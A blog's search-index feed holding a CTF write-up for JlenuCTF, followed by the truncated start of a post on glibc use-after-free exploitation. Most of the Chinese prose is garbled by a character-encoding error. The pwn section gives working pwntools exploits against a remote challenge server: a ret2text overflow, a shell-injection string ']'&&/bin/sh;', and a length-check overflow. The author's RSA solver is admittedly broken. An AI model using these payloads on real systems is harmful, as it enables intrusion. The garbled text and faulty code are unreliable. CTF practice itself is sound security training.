<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JlenuCTF</title>
      <link href="2021/05/23/JlenuCTF/"/>
      <url>2021/05/23/JlenuCTF/</url>
      
        <content type="html"><![CDATA[<p>åæ­£äº¤å®Œwpäº†ï¼Œç´¢æ€§æ°´ä¸ªåšå®¢å§ï¼ˆ</p><h2 id="HAPPYGAME"><a href="#HAPPYGAME" class="headerlink" title="HAPPYGAME"></a>HAPPYGAME</h2><h3 id="SIMPIOT"><a href="#SIMPIOT" class="headerlink" title="SIMPIOT"></a>SIMPIOT</h3><p>åˆ°æ‰‹åç›´æ¥stringsä¸€æ³¢ï¼Œå•Šè¿™</p><p><img src="https://i.loli.net/2021/05/22/KxLRHa4nw7hP8rY.png" alt=""></p><h3 id="ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº"><a href="#ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº" class="headerlink" title="ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº"></a>ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº</h3><p>æˆ‘æ„¿ç§°ä¸ºæœ€å¼ºé¢˜ç›®ï¼Œé›ªå®yyds</p><p>ğŸ‘´ğŸ»ä¸€å¼€å§‹ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œä¸‹è½½ä¸‹æ¥www.zipæ˜¯è¿™æ ·çš„ï¼Œè«ä¸æ˜¯ğŸ‘´ğŸ»è¢«æ…å±äº†ï¼Œæµªè´¹äº†ğŸ‘´ğŸ»ä¸€ä¸ªåŠå°æ—¶çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åè¿˜çœŸç»™ğŸ‘´ğŸ»æŸ¥å‡ºä¸ªå¨èƒæƒ…æŠ¥ipæ¥</p><p><img src="https://i.loli.net/2021/05/22/LHRF74sqPt3TV9D.png" alt=""></p><p><img src="https://i.loli.net/2021/05/22/KNnSZ8rAUVWqfPc.png" alt=""></p><p>åæ¥ğŸ‘´ğŸ»æµ‹äº†ä¸€å †æ— ç”¨åŠŸï¼Œæ‰¾äº†ä¸€äº›æ—¥å¿—å®¡è®¡è„šæœ¬å’Œæ‰‹å†™æ­£åˆ™çš„è„šæœ¬ï¼Œå‘ç°å•¥éƒ½æŸ¥ä¸åˆ°ï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼ŒğŸ‘´ğŸ»å¯»æ€happygameç»™ğŸ‘´ğŸ»æ•´ä¸happyäº†ï¼ŒğŸ‘´ğŸ»å¾ˆæ°”æ„¤ï¼ŒğŸ‘´ğŸ»å»ç¡è§‰äº†</p><p>ğŸ‘´ğŸ»ç¬¬äºŒå¤©è¶Šæƒ³è¶Šæ°”ï¼ŒğŸ‘´ğŸ»å†³å®šå†æ¥åšä¸€åšï¼ŒğŸ‘´ğŸ»é‡æ–°ä¸‹è½½www.zipï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼Œç«Ÿç„¶æ˜¯ç½‘ç«™æºç ï¼Œ****</p><p>å¥½äº†ï¼Œå¼€å§‹å®¡è®¡ï¼Œripsç»™ğŸ‘´ğŸ»æ‰«</p><p><img src="https://i.loli.net/2021/05/23/qvtuL1K3yZToQCB.png" alt=""></p><p>æ‰«å‡ºæ¥æœ¨é©¬äº†ï¼ŒğŸ‘´ğŸ»ç›´æ¥è¿shellï¼Œç„¶åhacked by HSYM</p><h3 id="ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥"><a href="#ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥" class="headerlink" title="ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥"></a>ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥</h3><p><img src="https://i.loli.net/2021/05/23/2dEKNoIMWHhtbGf.png" style="zoom:50%;" /></p><p>å®¡æ—¥å¿—ï¼Œipåˆ°æ‰‹</p><h3 id="ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†"><a href="#ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†"></a>ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†</h3><p>è®¿é—®å¸¦é»‘å®¢çš„ç½‘ç«™ï¼Œå‘ç°æ‰£æ‰£å·ï¼Œæ‰¾åˆ°ä»–çš„ç”Ÿæ—¥äº†ï¼Œæœ‰hintï¼Œåšå®¢åå°æ˜¯id+ç”Ÿæ—¥</p><p><img src="https://i.loli.net/2021/05/23/JYo1FjGAEbpklhi.png" alt=""></p><p>ç„¶åå°±å¯ä»¥è¿›å¸¦é»‘å®¢çš„åå°äº†</p><h3 id="ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢"><a href="#ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢" class="headerlink" title="ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢"></a>ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢</h3><p>è¿™ä¸ªğŸ‘´ğŸ»æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸çŸ¥é“å“ªé‡Œä¸å¯¹ï¼Œå…ˆè®°å½•ä¸€ä¸‹8</p><p>è¿›äº†åå°ï¼Œç”¨msfè¿æ¥shellä¸å°±è¡Œäº†</p><p>ç„¶åæ‰¾åˆ°äº†è¿™ä¸ªudf.phpï¼Œæœ‰ä¸ä¼šä¿®ç”µè„‘å¸ˆå‚…ç•™ä¸‹çš„åé—¨ï¼Œè¿™ä¸ç›´æ¥æ‹¿æ¥ç”¨ä¸€æ³¢</p><p>ç„¶åå°è¯•æŸ¥çœ‹backupå‘ç°disable_functionç»™banäº†å¥½å¤šsystemä¹‹ç±»çš„ä¸œè¥¿ï¼Œç®—äº†ï¼Œå†çœ‹çœ‹åˆ«çš„ç›®å½•</p><p>ç„¶åå‘ç°äº†è¿™ä¸ª</p><p><img src="https://i.loli.net/2021/05/23/klZN8cqTEMKp2Qg.png" style="zoom:50%;" /></p><p>èŠœæ¹–ï¼Œç„¶åé‚®ç®±å¯†ç å°±æ‹¿åˆ°äº†ï¼Œç”¨å¸¦é»‘å®¢çš„ProtonMailé‚®ç®±ç™»è¿›å»ï¼Œå‘ç°åšæœäº‘2333</p><p><img src="https://i.loli.net/2021/05/23/pxSX9ogACfr5BY1.png" style="zoom:50%;" /></p><p>å‘ç°å¸¦é»‘å®¢çš„èº«ä»½è¯ï¼Œé‚£æŒ‰ç†æ¥è¯´é»‘å®¢å°±ä½åœ¨ä¸‹åŒ—æ³½ï¼Ÿä½†æ˜¯flagä¸å¯¹</p><p><img src="https://i.loli.net/2021/05/23/QXrWPYkZ62uTCNs.png" style="zoom:50%;" /></p><p>æ‰€ä»¥ğŸ‘´ğŸ»ç™¾åº¦ç™¾ç§‘æŸ¥åˆ°äº†ä¸‹åŒ—æ³½çš„å„ç§å«æ³•å’Œä¸‹åŒ—æ³½åœ¨æ—¥æœ¬çš„å…·ä½“ä½ç½®ï¼Œéƒ½ä¸å¯¹ï¼Œç®—äº†ï¼Œä¸åšäº†ï¼Œè¡¥ä½œä¸šå»äº†ï¼ˆx</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h3><p>ç›´æ¥åœ¨consoleé‡Œè°ƒç”¨jsä»£ç å³å¯å¼¹å‡ºflag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="WHATS-HAPPEN"><a href="#WHATS-HAPPEN" class="headerlink" title="WHATS HAPPEN?"></a>WHATS HAPPEN?</h3><p>ç®€å•çš„ç›²æ–‡ï¼Œæ‰¾ä¸ªåœ¨çº¿è§£å¯†çš„ä¸€æŠŠæ¢­å°±å¥½äº†</p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby_RSA"></a>Baby_RSA</h3><p>è™½ç„¶æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ€è·¯æ²¡é—®é¢˜ï¼Œå…ˆå¡«ä¸ªå‘ï¼Œä¸çŸ¥é“ä¸­é—´å“ªä¸€æ­¥é”™äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">  <span class="keyword">return</span> sympy.randprime(<span class="number">2</span>**(bits-<span class="number">1</span>), <span class="number">2</span>**bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">bits</span>):</span></span><br><span class="line">    p = get_random_prime(bits)</span><br><span class="line">    q = get_random_prime(bits)</span><br><span class="line">    r = get_random_prime(bits)</span><br><span class="line">    e = get_random_prime(<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(e,phi)==<span class="number">1</span></span><br><span class="line">    d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,(gcd(q-<span class="number">1</span>,r-<span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> (e,d,p*q*r)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg,e,n</span>):</span></span><br><span class="line">    cipher=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;nflag.enc&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">hex</span>(cipher)[<span class="number">2</span>:])</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_pubkey</span>(<span class="params">n,e</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&#x27;npubkey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">e,d,n=gen_key(<span class="number">256</span>)</span><br><span class="line">export_pubkey(n,e)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;d:&quot;</span>,d)</span><br><span class="line"><span class="comment">#d:6848345389131232097250291554774004483864247462767351912899751705063009304102012225840379809975695209148626539132005837425458215616241927473070938221119168859672496841054510245128799501775634965114887272776082740599056090759932017</span></span><br><span class="line">encrypt(flag,<span class="number">7</span>,n)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆç»™äº†dï¼Œè§£å‡ºæ¥pqï¼Œç„¶ååŠ å¯†çš„æ—¶å€™åˆæŠŠeæ¢æˆäº†7</p><p>ä½†æ˜¯è§£çš„æ—¶å€™è§£ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œé”™äº†ï¼Œorz</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xcd2e55e25e84bd7e050e4e28e0725f2b02442e2d55fcc8053f53811610b7a8e1d3aa2d3f3e3923d3f5ad20e00fbe532b255768d77d9e07fc23bbc6c039d741d9</span></span><br><span class="line">q = <span class="number">0xa170bce7723a072e1cfa7b466916939df85d1b97d29c73d5f3cdd8cf49f8194f</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c = <span class="number">0x3773fd7f928a0231c0a26e48678984fc36db84f4d63de0cdb36a3101e6e48e140a21b6a6fae834dfaa2670d36444a5f002d28a5d4a9efb6822af43d4d98f4aa9a18139b76527049d2c4419d7ad4ddd9ef65ec7176842aa9ced2f8b14af7bf731</span></span><br><span class="line">s = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = long(gmpy2.invert(e, s))</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">pow</span>(c, e, d))</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-sender"><a href="#easy-sender" class="headerlink" title="easy_sender"></a>easy_sender</h3><p>ç­¾åˆ°é¢˜ï¼Œret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./easysender&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(<span class="number">0x080491B6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strread"><a href="#strread" class="headerlink" title="strread"></a>strread</h3><p>æœ‰webå†…å‘³äº†ï¼Œå°è¯•ç”¨å•å¼•å·å’Œåˆ†å·é—­åˆï¼Œpayloadæ˜¯è¯•å‡ºæ¥çš„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./white&#x27;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Path to follow:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;]&#x27;&amp;&amp;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strlenvsread"><a href="#strlenvsread" class="headerlink" title="strlenvsread"></a>strlenvsread</h3><p><img src="https://i.loli.net/2021/05/22/ZUKae2Nf7WwczAu.png" alt=""></p><p>æ¼æ´ç‚¹åœ¨äºstrlenè¯»å–çš„é•¿åº¦å¯ä»¥è¢«00æˆªæ–­ï¼Œä½†æ˜¯readçš„è¿”å›å€¼ä¸å¯ä»¥ï¼Œæº¢å‡ºå°±å®Œäº‹äº†å—·</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./strlenvsread&#x27;</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Neo, enter your matrix: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Make your choice: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="MEGA-RACE"><a href="#MEGA-RACE" class="headerlink" title="MEGA-RACE"></a>MEGA-RACE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">scram</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i] ^= <span class="number">0x77</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„å¼‚æˆ–ï¼Œå†™ä¸ªè„šæœ¬ç®€å•è§£å¯†å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pass[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(pass);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pass[i] = pass[i] ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-py"><a href="#easy-py" class="headerlink" title="easy_py"></a>easy_py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># while None:</span></span><br><span class="line"><span class="comment">#     Happy = [</span></span><br><span class="line"><span class="comment">#         39,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         8,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         51,</span></span><br><span class="line"><span class="comment">#         70,</span></span><br><span class="line"><span class="comment">#         21,</span></span><br><span class="line"><span class="comment">#         65,</span></span><br><span class="line"><span class="comment">#         11,</span></span><br><span class="line"><span class="comment">#         112,</span></span><br><span class="line"><span class="comment">#         22,</span></span><br><span class="line"><span class="comment">#         111,</span></span><br><span class="line"><span class="comment">#         33,</span></span><br><span class="line"><span class="comment">#         82,</span></span><br><span class="line"><span class="comment">#         93,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         72,</span></span><br><span class="line"><span class="comment">#         77,</span></span><br><span class="line"><span class="comment">#         125,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         74,</span></span><br><span class="line"><span class="comment">#         27,</span></span><br><span class="line"><span class="comment">#         98,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         87,</span></span><br><span class="line"><span class="comment">#         0,</span></span><br><span class="line"><span class="comment">#         95,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         117,</span></span><br><span class="line"><span class="comment">#         42,</span></span><br><span class="line"><span class="comment">#         122,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         103,</span></span><br><span class="line"><span class="comment">#         88]</span></span><br><span class="line"><span class="comment">#     num = 37</span></span><br><span class="line"><span class="comment">#     f = input(&#x27;Please input your flag:&#x27;)</span></span><br><span class="line"><span class="comment">#     if len(f) != 38:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Your input is illegal&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     flag = list(f)</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in flag:</span></span><br><span class="line"><span class="comment">#         flag[j] = ord(i)</span></span><br><span class="line"><span class="comment">#         j += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     t1 = threading.Thread(encode_1, (1,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t2 = threading.Thread(encode_2, (2,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t1.start()</span></span><br><span class="line"><span class="comment">#     time.sleep(0.5)</span></span><br><span class="line"><span class="comment">#     t2.start()</span></span><br><span class="line"><span class="comment">#     t1.join()</span></span><br><span class="line"><span class="comment">#     t2.join()</span></span><br><span class="line"><span class="comment">#     if flag == Happy:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Good job!&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(&#x27;No no no!&#x27;)</span></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸ªå¤šçº¿ç¨‹ï¼Œencodeå‡½æ•°æ˜¯ç®€å•çš„å¼‚æˆ–</p><p>ç®€å•å†™ä¸ªè§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    flag = [</span><br><span class="line">        <span class="number">39</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">11</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">82</span>,</span><br><span class="line">        <span class="number">93</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">74</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">    templist = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># flag = templist</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        templist[i] = <span class="built_in">chr</span>(templist[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(templist))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸åŒç‰ˆæœ¬Glibcä¸‹çš„UAFæ¼æ´åˆ©ç”¨</title>
      <link href="2021/05/18/GlibcUAF/"/>
      <url>2021/05/18/GlibcUAF/</url>
      
        <content type="html"><![CDATA[<p>â€‹    ç”±äºç°åœ¨CTFæ¯”èµ›ä¸­ï¼Œpwnæ–¹å‘æ¶‰åŠçš„libcç‰ˆæœ¬ä¼—å¤šï¼Œä¸åŒç‰ˆæœ¬ä¹‹é—´çš„å †å—åœ¨ç»„ç»‡æ–¹å¼ä¸Šéƒ½æœ‰å·®åˆ«ï¼Œåˆšå¼€å§‹å­¦ä¹ çš„å †çš„æœ‹å‹ä»¬å¤§å¤šæ•°éƒ½æ˜¯ä»æœ€ç»å…¸çš„UAFæ¥å…¥æ‰‹çš„ï¼Œæœ¬æ–‡æ¥é€šè¿‡åŒä¸€ä¸ªUAFçš„demoç¨‹åºï¼Œæ¥æ¥å¤§å®¶äº¤æµå­¦ä¹ ä¸‹ä¸‹ä¸åŒç‰ˆæœ¬libcä¸‹çš„åˆ©ç”¨æ‰‹æ³•ã€‚</p><p>â€‹    ç¨‹åºæºç å¦‚ä¸‹ï¼Œç»™å‡ºäº†è¾ƒä¸ºå®½æ¾çš„å †å—ç¼–è¾‘æ–¹å¼å’Œç»„ç»‡æ–¹å¼ï¼Œæ–¹ä¾¿è®¨è®ºåˆ©ç”¨æ‰‹æ³•ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizearray[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> *heaparray[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 